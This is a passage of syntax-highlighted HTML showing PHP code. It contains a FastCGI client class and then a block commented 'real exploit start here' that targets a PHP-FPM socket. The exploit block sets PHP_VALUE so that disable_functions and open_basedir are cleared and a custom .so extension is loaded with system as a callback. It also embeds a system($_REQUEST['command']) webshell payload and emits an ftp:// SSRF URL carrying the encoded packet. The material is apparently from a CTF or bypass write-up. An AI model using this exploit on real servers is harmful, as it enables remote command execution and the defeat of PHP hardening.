<span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token comment">/* nameLengthB3 &amp; nameLengthB2 &amp; nameLengthB1 &amp; nameLengthB0 */</span>            <span class="token variable">$nvpair</span> <span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">>></span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">0x80</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">>></span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$vlen</span> <span class="token operator">&lt;</span> <span class="token number">128</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">/* valueLengthB0 */</span>            <span class="token variable">$nvpair</span> <span class="token operator">.=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$vlen</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token comment">/* valueLengthB3 &amp; valueLengthB2 &amp; valueLengthB1 &amp; valueLengthB0 */</span>            <span class="token variable">$nvpair</span> <span class="token operator">.=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$vlen</span> <span class="token operator">>></span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">0x80</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$vlen</span> <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$vlen</span> <span class="token operator">>></span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$vlen</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">/* nameData &amp; valueData */</span>        <span class="token keyword">return</span> <span class="token variable">$nvpair</span> <span class="token operator">.</span> <span class="token variable">$name</span> <span class="token operator">.</span> <span class="token variable">$value</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * Read a set of FastCGI Name value pairs     *     * @param String $data Data containing the set of FastCGI NVPair     * @return array of NVPair     */</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">readNvpair</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$length</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$array</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$length</span> <span class="token operator">===</span> <span class="token constant">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$length</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$p</span> <span class="token operator">!=</span> <span class="token variable">$length</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$nlen</span> <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">>=</span> <span class="token number">128</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$nlen</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">&amp;</span> <span class="token number">0x7F</span> <span class="token operator">&lt;&lt;</span> <span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$nlen</span> <span class="token operator">|=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$nlen</span> <span class="token operator">|=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$nlen</span> <span class="token operator">|=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token variable">$vlen</span> <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$vlen</span> <span class="token operator">>=</span> <span class="token number">128</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$vlen</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">&amp;</span> <span class="token number">0x7F</span> <span class="token operator">&lt;&lt;</span> <span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$vlen</span> <span class="token operator">|=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$vlen</span> <span class="token operator">|=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$vlen</span> <span class="token operator">|=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token variable">$array</span><span class="token punctuation">[</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token punctuation">,</span> <span class="token variable">$nlen</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token operator">+</span><span class="token variable">$nlen</span><span class="token punctuation">,</span> <span class="token variable">$vlen</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$p</span> <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">+</span> <span class="token variable">$vlen</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token variable">$array</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * Decode a FastCGI Packet     *     * @param String $data String containing all the packet     * @return array     */</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">decodePacketHeader</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'version'</span><span class="token punctuation">]</span>       <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span>          <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'requestId'</span><span class="token punctuation">]</span>     <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token number">2</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token number">3</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'contentLength'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token number">4</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token number">5</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'paddingLength'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token number">6</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'reserved'</span><span class="token punctuation">]</span>      <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token number">7</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$ret</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * Read a FastCGI Packet     *     * @return array     */</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">readPacket</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$packet</span> <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_sock</span><span class="token punctuation">,</span> <span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">HEADER_LEN</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$resp</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">decodePacketHeader</span><span class="token punctuation">(</span><span class="token variable">$packet</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'contentLength'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$len</span>  <span class="token operator">=</span> <span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'contentLength'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$len</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$buf</span><span class="token operator">=</span><span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_sock</span><span class="token punctuation">,</span> <span class="token variable">$len</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token variable">$len</span> <span class="token operator">-=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$buf</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span> <span class="token operator">.=</span> <span class="token variable">$buf</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'paddingLength'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$buf</span><span class="token operator">=</span><span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_sock</span><span class="token punctuation">,</span> <span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'paddingLength'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">return</span> <span class="token variable">$resp</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * Get Informations on the FastCGI application     *     * @param array $requestedInfo information to retrieve     * @return array     */</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getValues</span><span class="token punctuation">(</span><span class="token keyword type-hint">array</span> <span class="token variable">$requestedInfo</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$request</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$requestedInfo</span> <span class="token keyword">as</span> <span class="token variable">$info</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$request</span> <span class="token operator">.=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">buildNvpair</span><span class="token punctuation">(</span><span class="token variable">$info</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_sock</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">buildPacket</span><span class="token punctuation">(</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">GET_VALUES</span><span class="token punctuation">,</span> <span class="token variable">$request</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$resp</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">readPacket</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">GET_VALUES_RESULT</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">readNvpair</span><span class="token punctuation">(</span><span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'length'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Unexpected response type, expecting GET_VALUES_RESULT'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * Execute a request to the FastCGI application     *     * @param array $params Array of parameters     * @param String $stdin Content     * @return String     */</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">request</span><span class="token punctuation">(</span><span class="token keyword type-hint">array</span> <span class="token variable">$params</span><span class="token punctuation">,</span> <span class="token variable">$stdin</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$response</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span><span class="token comment">//        $this->connect();</span>        <span class="token variable">$request</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">buildPacket</span><span class="token punctuation">(</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">BEGIN_REQUEST</span><span class="token punctuation">,</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">RESPONDER</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword type-casting">int</span><span class="token punctuation">)</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_keepAlive</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">str_repeat</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$paramsRequest</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$params</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$paramsRequest</span> <span class="token operator">.=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">buildNvpair</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$paramsRequest</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$request</span> <span class="token operator">.=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">buildPacket</span><span class="token punctuation">(</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">PARAMS</span><span class="token punctuation">,</span> <span class="token variable">$paramsRequest</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$request</span> <span class="token operator">.=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">buildPacket</span><span class="token punctuation">(</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">PARAMS</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$stdin</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$request</span> <span class="token operator">.=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">buildPacket</span><span class="token punctuation">(</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">STDIN</span><span class="token punctuation">,</span> <span class="token variable">$stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$request</span> <span class="token operator">.=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">buildPacket</span><span class="token punctuation">(</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">STDIN</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'?file=ftp://ip:9999/&amp;data='</span><span class="token operator">.</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//        fwrite($this->_sock, $request);</span><span class="token comment">//        do &#123;</span><span class="token comment">//            $resp = $this->readPacket();</span><span class="token comment">//            if ($resp['type'] == self::STDOUT || $resp['type'] == self::STDERR) &#123;</span><span class="token comment">//                $response .= $resp['content'];</span><span class="token comment">//            &#125;</span><span class="token comment">//        &#125; while ($resp &amp;&amp; $resp['type'] != self::END_REQUEST);</span><span class="token comment">//        var_dump($resp);</span><span class="token comment">//        if (!is_array($resp)) &#123;</span><span class="token comment">//            throw new Exception('Bad request');</span><span class="token comment">//        &#125;</span><span class="token comment">//        switch (ord($resp['content']&#123;4&#125;)) &#123;</span><span class="token comment">//            case self::CANT_MPX_CONN:</span><span class="token comment">//                throw new Exception('This app can\'t multiplex [CANT_MPX_CONN]');</span><span class="token comment">//                break;</span><span class="token comment">//            case self::OVERLOADED:</span><span class="token comment">//                throw new Exception('New request rejected; too busy [OVERLOADED]');</span><span class="token comment">//                break;</span><span class="token comment">//            case self::UNKNOWN_ROLE:</span><span class="token comment">//                throw new Exception('Role value not known [UNKNOWN_ROLE]');</span><span class="token comment">//                break;</span><span class="token comment">//            case self::REQUEST_COMPLETE:</span><span class="token comment">//                return $response;</span><span class="token comment">//        &#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">// real exploit start here</span><span class="token comment">//if (!isset($_REQUEST['cmd'])) &#123;</span><span class="token comment">//    die("Check your input\n");</span><span class="token comment">//&#125;</span><span class="token comment">//if (!isset($_REQUEST['filepath'])) &#123;</span><span class="token comment">//    $filepath = __FILE__;</span><span class="token comment">//&#125;else&#123;</span><span class="token comment">//    $filepath = $_REQUEST['filepath'];</span><span class="token comment">//&#125;</span><span class="token variable">$filepath</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/var/www/html/add_api.php"</span><span class="token punctuation">;</span><span class="token variable">$req</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$filepath</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$uri</span> <span class="token operator">=</span> <span class="token variable">$req</span> <span class="token operator">.</span><span class="token string single-quoted-string">'?'</span><span class="token operator">.</span><span class="token string single-quoted-string">'command=whoami'</span><span class="token punctuation">;</span><span class="token variable">$client</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FCGIClient</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"unix:///var/run/php-fpm.sock"</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$code</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"&lt;?php system(\$_REQUEST['command']); phpinfo(); ?>"</span><span class="token punctuation">;</span> <span class="token comment">// php payload -- Doesnt do anything</span><span class="token variable">$php_value</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"unserialize_callback_func = system\nextension_dir = /var/www/html\nextension = hpdoger.so\ndisable_classes = \ndisable_functions = \nallow_url_include = On\nopen_basedir = /\nauto_prepend_file = "</span><span class="token punctuation">;</span> <span class="token comment">// extension_dir即为.so文件所在目录</span><span class="token variable">$params</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>    <span class="token string single-quoted-string">'GATEWAY_INTERFACE'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'FastCGI/1.0'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'REQUEST_METHOD'</span>    <span class="token operator">=></span> <span class="token string single-quoted-string">'POST'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'SCRIPT_FILENAME'</span>   <span class="token operator">=></span> <span class="token variable">$filepath</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'SCRIPT_NAME'</span>       <span class="token operator">=></span> <span class="token variable">$req</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'QUERY_STRING'</span>      <span class="token operator">=></span> <span class="token string single-quoted-string">'command=whoami'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'REQUEST_URI'</span>       <span class="token operator">=></span> <span class="token variable">$uri</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'DOCUMENT_URI'</span>      <span class="token operator">=></span> <span class="token variable">$req</span><span class="token punctuation">,</span><span class="token comment">#'DOCUMENT_ROOT'     => '/',</span>    <span class="token string single-quoted-string">'PHP_VALUE'</span>         <span class="token operator">=></span> <span class="token variable">$php_value</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'SERVER_SOFTWARE'</span>   <span class="token operator">=></span> <span class="token string single-quoted-string">'80sec/wofeiwo'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'REMOTE_ADDR'</span>       <span class="token operator">=></span> <span class="token string single-quoted-string">'127.0.0.1'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'REMOTE_PORT'</span>       <span class="token operator">=></span> <span class="token string single-quoted-string">'9001'</span><span class="token punctuation">,</span> <span class="token comment">// 找准服务端口</span>    <span class="token string single-quoted-string">'SERVER_ADDR'</span>       <span class="token operator">=></span> <span class="token string single-quoted-string">'127.0.0.1'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'SERVER_PORT'</span>       <span class="token operator">=></span> <span class="token string single-quoted-string">'80'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'SERVER_NAME'</span>       <span class="token operator">=></span> <span class="token string single-quoted-string">'localhost'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'SERVER_PROTOCOL'</span>   <span class="token operator">=></span> <span class="token string single-quoted-string">'HTTP/1.1'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'CONTENT_LENGTH'</span>    <span class="token operator">=></span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// print_r($_REQUEST);</span><span 